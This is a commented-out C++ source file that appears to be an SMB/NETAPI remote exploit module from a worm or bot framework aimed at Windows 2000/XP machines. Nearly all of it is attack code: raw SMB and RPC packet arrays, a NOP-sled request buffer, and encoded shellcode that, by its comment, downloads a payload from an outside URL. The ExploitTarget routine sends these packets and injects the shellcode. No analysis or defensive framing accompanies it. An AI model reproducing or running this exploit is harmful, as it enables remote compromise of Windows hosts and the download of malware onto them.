/*#include <winsock2.h>
#include "exploit_netapi.h"

CHAR NBSS[72] =
{
    0x81, 0x00, 0x00, 0x44, 0x20, 0x43, 0x4B, 0x46, 0x44, 0x45, 0x4E, 0x45, 0x43, 0x46, 0x44, 0x45, 
    0x46, 0x46, 0x43, 0x46, 0x47, 0x45, 0x46, 0x46, 0x43, 0x43, 0x41, 0x43, 0x41, 0x43, 0x41, 0x43, 
    0x41, 0x43, 0x41, 0x43, 0x41, 0x00, 0x20, 0x43, 0x41, 0x43, 0x41, 0x43, 0x41, 0x43, 0x41, 0x43, 
    0x41, 0x43, 0x41, 0x43, 0x41, 0x43, 0x41, 0x43, 0x41, 0x43, 0x41, 0x43, 0x41, 0x43, 0x41, 0x43, 
    0x41, 0x43, 0x41, 0x43, 0x41, 0x41, 0x41, 0x00, 
} ;

CHAR SMB1[88] =
{
    0x00, 0x00, 0x00, 0x54, 0xFF, 0x53, 0x4D, 0x42, 0x72, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x28, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7C, 0x0E, 
    0x00, 0x00, 0xC0, 0xDC, 0x00, 0x31, 0x00, 0x02, 0x4C, 0x41, 0x4E, 0x4D, 0x41, 0x4E, 0x31, 0x2E, 
    0x30, 0x00, 0x02, 0x4C, 0x4D, 0x31, 0x2E, 0x32, 0x58, 0x30, 0x30, 0x32, 0x00, 0x02, 0x4E, 0x54, 
    0x20, 0x4C, 0x41, 0x4E, 0x4D, 0x41, 0x4E, 0x20, 0x31, 0x2E, 0x30, 0x00, 0x02, 0x4E, 0x54, 0x20, 
    0x4C, 0x4D, 0x20, 0x30, 0x2E, 0x31, 0x32, 0x00, 
} ;

CHAR SMB2[176] =
{
    0x00, 0x00, 0x00, 0xAC, 0xFF, 0x53, 0x4D, 0x42, 0x73, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x28, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7C, 0x0E, 
    0x00, 0x00, 0xC0, 0xDC, 0x0C, 0xFF, 0x00, 0x00, 0x00, 0xDF, 0xFF, 0x02, 0x00, 0x01, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x4E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x5C, 0xD0, 0x00, 0x80, 0x71, 0x00, 0x60, 
    0x4C, 0x06, 0x06, 0x2B, 0x06, 0x01, 0x05, 0x05, 0x02, 0xA0, 0x42, 0x30, 0x40, 0xA0, 0x0E, 0x30, 
    0x0C, 0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0A, 0xA2, 0x2E, 0x04, 
    0x2C, 0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x02, 0x08, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x0C, 0x00, 0x0C, 0x00, 0x20, 0x00, 0x00, 
    0x00, 0x57, 0x4F, 0x52, 0x4B, 0x53, 0x54, 0x41, 0x54, 0x49, 0x4F, 0x4E, 0x31, 0x57, 0x69, 0x6E, 
    0x64, 0x6F, 0x77, 0x73, 0x20, 0x32, 0x30, 0x30, 0x30, 0x20, 0x32, 0x31, 0x39, 0x35, 0x00, 0x57, 
    0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20, 0x32, 0x30, 0x30, 0x30, 0x20, 0x35, 0x2E, 0x30, 0x00, 
} ;

CHAR SMB3[246] =
{
    0x00, 0x00, 0x00, 0xF2, 0xFF, 0x53, 0x4D, 0x42, 0x73, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x28, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7C, 0x0E, 
    0x00, 0x08, 0xC0, 0xDC, 0x0C, 0xFF, 0x00, 0x00, 0x00, 0xDF, 0xFF, 0x02, 0x00, 0x01, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x94, 0x00, 0x00, 0x00, 0x00, 0x00, 0x5C, 0xD0, 0x00, 0x80, 0xB7, 0x00, 0xA1, 
    0x81, 0x91, 0x30, 0x81, 0x8E, 0xA2, 0x81, 0x8B, 0x04, 0x81, 0x88, 0x4E, 0x54, 0x4C, 0x4D, 0x53, 
    0x53, 0x50, 0x00, 0x03, 0x00, 0x00, 0x00, 0x18, 0x00, 0x18, 0x00, 0x40, 0x00, 0x00, 0x00, 0x18, 
    0x00, 0x18, 0x00, 0x58, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x70, 0x00, 0x00, 0x00, 0x18, 0x00, 0x18, 0x00, 0x70, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x02, 0x08, 0x00, 0x00, 0x01, 0x02, 0x03, 0x04, 
    0x05, 0x06, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x27, 0x1D, 0x21, 0xC3, 0x9C, 0xD8, 0x39, 0x7A, 0xF9, 0xD6, 0x36, 0x57, 0x7A, 
    0x89, 0x41, 0x70, 0x09, 0x9D, 0x71, 0xD5, 0xDD, 0x3F, 0x0F, 0xDC, 0x57, 0x00, 0x4F, 0x00, 0x52, 
    0x00, 0x4B, 0x00, 0x53, 0x00, 0x54, 0x00, 0x41, 0x00, 0x54, 0x00, 0x49, 0x00, 0x4F, 0x00, 0x4E, 
    0x00, 0x31, 0x00, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20, 0x32, 0x30, 0x30, 0x30, 0x20, 
    0x32, 0x31, 0x39, 0x35, 0x00, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20, 0x32, 0x30, 0x30, 
    0x30, 0x20, 0x35, 0x2E, 0x30, 0x00, 
} ;

CHAR SMB4[62] =
{
    0x00, 0x00, 0x00, 0x3A, 0xFF, 0x53, 0x4D, 0x42, 0x75, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x20, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7C, 0x0E, 
    0x00, 0x08, 0xC0, 0xDC, 0x04, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x0F, 0x00, 0x00, 
    0x5C, 0x5C, 0x5C, 0x49, 0x50, 0x43, 0x24, 0x00, 0x3F, 0x3F, 0x3F, 0x3F, 0x3F, 0x00, 
} ;

CHAR SMB5[96] =
{
    0x00, 0x00, 0x00, 0x5C, 0xFF, 0x53, 0x4D, 0x42, 0xA2, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x20, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x7C, 0x0E, 
    0x00, 0x08, 0xC0, 0xDC, 0x18, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x16, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x9F, 0x01, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 
    0x02, 0x00, 0x00, 0x00, 0x00, 0x09, 0x00, 0x5C, 0x42, 0x52, 0x4F, 0x57, 0x53, 0x45, 0x52, 0x00, 
} ;

CHAR RPC0[150] =
{
    0x00, 0x00, 0x00, 0x92, 0xFF, 0x53, 0x4D, 0x42, 0x25, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x20, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x7C, 0x0E, 
    0x00, 0x08, 0xC0, 0xDC, 0x10, 0x00, 0x00, 0x48, 0x00, 0x00, 0x04, 0xE0, 0xFF, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4A, 0x00, 0x48, 0x00, 0x4A, 0x00, 0x02, 
    0x00, 0x26, 0x00, 0x00, 0x40, 0x4F, 0x00, 0x5C, 0x50, 0x49, 0x50, 0x45, 0x5C, 0x00, 0x05, 0x00, 
    0x0B, 0x03, 0x10, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xD0, 0x16, 
    0xD0, 0x16, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0xC8, 0x4F, 
    0x32, 0x4B, 0x70, 0x16, 0xD3, 0x01, 0x12, 0x78, 0x5A, 0x47, 0xBF, 0x6E, 0xE1, 0x88, 0x03, 0x00, 
    0x00, 0x00, 0x04, 0x5D, 0x88, 0x8A, 0xEB, 0x1C, 0xC9, 0x11, 0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 
    0x48, 0x60, 0x02, 0x00, 0x00, 0x00, 
} ;

CHAR Request[874] =
{
    0x00, 0x00, 0x03, 0x66, 0xFF, 0x53, 0x4D, 0x42, 0x25, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x20, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x90, 0x0C, 
    0x00, 0x08, 0xE0, 0x75, 0x10, 0x00, 0x00, 0x1C, 0x03, 0x00, 0x04, 0xE0, 0xFF, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4A, 0x00, 0x1C, 0x03, 0x4A, 0x00, 0x02, 
    0x00, 0x26, 0x00, 0x00, 0x40, 0x23, 0x03, 0x5C, 0x50, 0x49, 0x50, 0x45, 0x5C, 0x00, 0x05, 0x00, 
    0x00, 0x03, 0x10, 0x00, 0x00, 0x00, 0x1C, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x03, 
    0x00, 0x00, 0x00, 0x00, 0x1F, 0x00, 0x72, 0x85, 0xAD, 0x06, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0xBC, 0x63, 0x01, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x63, 0x01, 0x00, 0x00, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 134
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x6A, 0x4E, 0x50, 0x4E, 0x4D, 0x57, 0x43, 0x68, 
    0x75, 0x30, 0x32, 0x4C, 0x6C, 0x35, 0x47, 0x6C, 0x71, 0x50, 0x70, 0x34, 0x4E, 0x75, 0x43, 0x4F, 
    0x37, 0x6E, 0x37, 0x38, 0x6D, 0x31, 0x62, 0x53, 0x58, 0x30, 0x53, 0x54, 0x48, 0x46, 0x4C, 0x7A, 
    0x47, 0x46, 0x65, 0x76, 0x73, 0x58, 0x31, 0x6C, 0x46, 0x39, 0x6B, 0x72, 0x4B, 0x76, 0x5A, 0x39, 
    0x5A, 0x66, 0x59, 0x6C, 0x31, 0x49, 0x6A, 0x5A, 0x41, 0x48, 0x5A, 0x67, 0x6A, 0x31, 0x76, 0x62, 
    0x4A, 0x4F, 0x68, 0x44, 0x41, 0x4F, 0x72, 0x34, 0x30, 0x39, 0x6B, 0x49, 0x46, 0x46, 0x4C, 0x64, 
    0x35, 0x52, 0x37, 0x30, 0x56, 0x7A, 0x56, 0x65, 0x72, 0x48, 0x77, 0x33, 0x59, 0x56, 0x68, 0x74, 
    0x33, 0x4B, 0x35, 0x6A, 0x4B, 0x31, 0x4D, 0x46, 0x52, 0x50, 0x6C, 0x34, 0x4E, 0x76, 0x43, 0x46, 
    0x33, 0x59, 0x48, 0x75, 0x57, 0x50, 0x75, 0x6E, 0x33, 0x64, 0x45, 0x63, 0x45, 0x33, 0x43, 0x70, 
    0x4C, 0x65, 0x35, 0x52, 0x76, 0x4C, 0x50, 0x38, 0x77, 0x46, 0x72, 0x75, 0x31, 0x32, 0x6E, 0x53, 
    0x58, 0x70, 0x59, 0x55, 0x5A, 0x64, 0x47, 0x63, 0x31, 0x4D, 0x6C, 0x6B, 0x7A, 0x68, 0x72, 0x35, 
    0x37, 0x62, 0x61, 0x49, 0x66, 0x44, 0x53, 0x51, 0x7A, 0x34, 0x33, 0x47, 0x64, 0x68, 0x4D, 0x39, 
    0x4E, 0x73, 0x50, 0x49, 0x35, 0x44, 0x30, 0x7A, 0x51, 0x4E, 0x77, 0x6C, 0x6E, 0x6B, 0x34, 0x57, 
    0x65, 0x58, 0x61, 0x63, 0x55, 0x39, 0x73, 0x4B, 0x4A, 0x4E, 0x58, 0x4C, 0x74, 0x72, 0x46, 0x72, 
    0x61, 0x44, 0x68, 0x32, 0x4A, 0x4E, 0x64, 0x34, 0x43, 0x52, 0x52, 0x78, 0x74, 0x59, 0x56, 0x56, 
    0x44, 0x45, 0x70, 0x61, 0x51, 0x63, 0x6B, 0x5A, 0x6A, 0x44, 0x0A, 0x08, 0x02, 0x00, 0x31, 0x73, 
    0x69, 0x56, 0x46, 0x78, 0x59, 0x52, 0x04, 0x08, 0x02, 0x00, 0x4B, 0x67, 0x34, 0x45, 0x53, 0x39, 
    0x51, 0x70, 0x6C, 0x70, 0x38, 0x6D, 0x4C, 0x6E, 0x70, 0x67, 0x59, 0x52, 0x51, 0x6A, 0x5A, 0x65, 
    0x31, 0x63, 0x57, 0x4B, 0x44, 0x70, 0x6F, 0x62, 0x53, 0x43, 0x04, 0x08, 0x02, 0x00, 0x57, 0x4F, 
    0x73, 0x54, 0x54, 0x6A, 0x51, 0x47, 0x04, 0x08, 0x02, 0x00, 0x5A, 0x70, 0x75, 0x75, 0x70, 0x38, 
    0x57, 0x71, 0x54, 0x75, 0x6F, 0x64, 0x55, 0x53, 0x56, 0x70, 0x48, 0x72, 0x57, 0x5A, 0x33, 0x6E, 
    0x4D, 0x4B, 0x4B, 0x31, 0x6B, 0x30, 0x32, 0x4F, 0x74, 0x6C, 0x00, 0x00, 0x1D, 0x79, 0x2B, 0x00, 
    0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x4F, 0x84, 0xBB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
} ;

CHAR Shellcode[] = // temporary shellcode to download http://tiny-url.us/f.php
	"\xfc\x43\x46\x99\xd6\x4b\xeb\x10\x5a\x4a\x33\xc9\x66\xb9\x3c\x01"
	"\x80\x34\x0a\x99\xe2\xfa\xeb\x05\xe8\xeb\xff\xff\xff\x70\x4c\x99"
	"\x99\x99\xc3\xfd\x38\xa9\x99\x99\x99\x12\xd9\x95\x12\xe9\x85\x34"
	"\x12\xd9\x91\x12\x41\x12\xea\xa5\x12\xed\x87\xe1\x9a\x6a\x12\xe7"
	"\xb9\x9a\x62\x12\xd7\x8d\xaa\x74\xcf\xce\xc8\x12\xa6\x9a\x62\x12"
	"\x6b\xf3\x97\xc0\x6a\x3f\xed\x91\xc0\xc6\x1a\x5e\x9d\xdc\x7b\x70"
	"\xc0\xc6\xc7\x12\x54\x12\xdf\xbd\x9a\x5a\x48\x78\x9a\x58\xaa\x50"
	"\xff\x12\x91\x12\xdf\x85\x9a\x5a\x58\x78\x9b\x9a\x58\x12\x99\x9a"
	"\x5a\x12\x63\x12\x6e\x1a\x5f\x97\x12\x49\xf3\x9d\xc0\x71\xc9\x99"
	"\x99\x99\x1a\x5f\x94\xcb\xcf\x66\xce\x65\xc3\x12\x41\xf3\x98\xc0"
	"\x71\xa4\x99\x99\x99\x1a\x5f\x8a\xcf\xdf\x19\xa7\x19\xec\x63\x19"
	"\xaf\x19\xc7\x1a\x75\xb9\x12\x45\xf3\xb9\xca\x66\xce\x75\x5e\x9d"
	"\x9a\xc5\xf8\xb7\xfc\x5e\xdd\x9a\x9d\xe1\xfc\x99\x99\xaa\x59\xc9"
	"\xc9\xca\xcf\xc9\x66\xce\x65\x12\x45\xc9\xca\x66\xce\x69\xc9\x66"
	"\xce\x6d\xaa\x59\x35\x1c\x59\xec\x60\xc8\xcb\xcf\xca\x66\x4b\xc3"
	"\xc0\x32\x7b\x77\xaa\x59\x5a\x71\xbf\x66\x66\x66\xde\xfc\xed\xc9"
	"\xeb\xf6\xfa\xd8\xfd\xfd\xeb\xfc\xea\xea\x99\xde\xfc\xed\xca\xe0"
	"\xea\xed\xfc\xf4\xdd\xf0\xeb\xfc\xfa\xed\xf6\xeb\xe0\xd8\x99\xce"
	"\xf0\xf7\xdc\xe1\xfc\xfa\x99\xdc\xe1\xf0\xed\xcd\xf1\xeb\xfc\xf8"
	"\xfd\x99\xd5\xf6\xf8\xfd\xd5\xf0\xfb\xeb\xf8\xeb\xe0\xd8\x99\xec"
	"\xeb\xf5\xf4\xf6\xf7\x99\xcc\xcb\xd5\xdd\xf6\xee\xf7\xf5\xf6\xf8"
	"\xfd\xcd\xf6\xdf\xf0\xf5\xfc\xd8\x99\x68\x74\x74\x70\x3a\x2f\x2f"
	"\x74\x69\x6e\x79\x2d\x75\x72\x6c\x2e\x75\x73\x2f\x66\x2e\x70\x68"
	"\x70\x80";

VOID ExploitNETAPI::ExploitTarget(VOID){
	::Socket Socket = GetInitialSocket();

	//dprintf("netapi\r\n");
	// still need to figure out why this only works with the encoded metasploit shellcode


	CHAR RecvBuf[1024];
	UINT Target = 0;

	Socket.Send(NBSS, sizeof(NBSS));
	Socket.Recv(RecvBuf, sizeof(RecvBuf));

	Socket.Send(SMB1, sizeof(SMB1));
	Socket.Recv(RecvBuf, sizeof(RecvBuf));

	Socket.Send(SMB2, sizeof(SMB2));
	Socket.Recv(RecvBuf, sizeof(RecvBuf));

	Socket.Send(SMB3, sizeof(SMB3));
	Socket.Recv(RecvBuf, sizeof(RecvBuf));

	if(strstr(RecvBuf, "5.0")){
		Target = 1;
	}else
	if(strstr(RecvBuf, "5.1")){
		Target = 2;
	}else
	if(strstr(RecvBuf, "4.0")){
		Target = 3;
	}
	Target = 2;

	Socket.Send(SMB4, sizeof(SMB4));
	Socket.Recv(RecvBuf, sizeof(RecvBuf));

	Socket.Send(SMB5, sizeof(SMB5));
	Socket.Recv(RecvBuf, sizeof(RecvBuf));

	Socket.Send(RPC0, sizeof(RPC0));
	Socket.Recv(RecvBuf, sizeof(RecvBuf));

	if(Target == 2){//WINXP

		Exploits.Mutex.WaitForAccess();
		if(!Exploits.GetPayload()){
			Exploits.Mutex.Release();
			return;
		}

		//memcpy(&Request[134], Exploits.GetPayload()->GetShellcode(), Exploits.GetPayload()->GetShellcodeSize());
		memcpy(&Request[134], Shellcode, sizeof(Shellcode) - 1);

		Exploits.Mutex.Release();

		Socket.Send(Request, sizeof(Request));
		Socket.Recv(RecvBuf, sizeof(RecvBuf));

		Socket.Send(Request, sizeof(Request));
		Socket.Recv(RecvBuf, sizeof(RecvBuf));
	}
	
}*/